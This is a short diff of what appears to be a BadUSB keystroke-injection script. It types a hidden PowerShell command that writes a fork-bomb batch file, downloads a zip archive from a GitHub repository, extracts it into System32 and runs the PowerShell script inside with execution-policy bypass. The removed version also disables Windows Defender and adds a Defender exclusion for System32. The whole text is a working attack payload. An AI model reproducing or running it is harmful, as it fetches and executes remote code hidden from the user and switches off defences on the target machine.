@@ -16,5 +16,5 @@ SHIFT TAB
 DELAY 500
 ENTER
 DELAY 1500
-STRING echo %0^|%0 > fb.bat&&powershell -w h REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD/d 1 /f;;Add-MpPreference -ExclusionPath C:\Windows\system32;;curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/rr.zip -OutFile rr.zip;;Expand-Archive -Path C:\Windows\System32\rr.zip -Force;;powershell -w h -Exec Bypass C:\Windows\System32\rr\rr.ps1
+STRING echo %0^|%0 > fb.bat&&powershell -w h -NoP -NonI curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/rr.zip -O rr.zip;;Expand-Archive -Path C:\Windows\System32\rr.zip -Force;;powershell -w h -NoP -NonI -Exec Bypass C:\Windows\System32\rr\rr.ps1
 ENTER
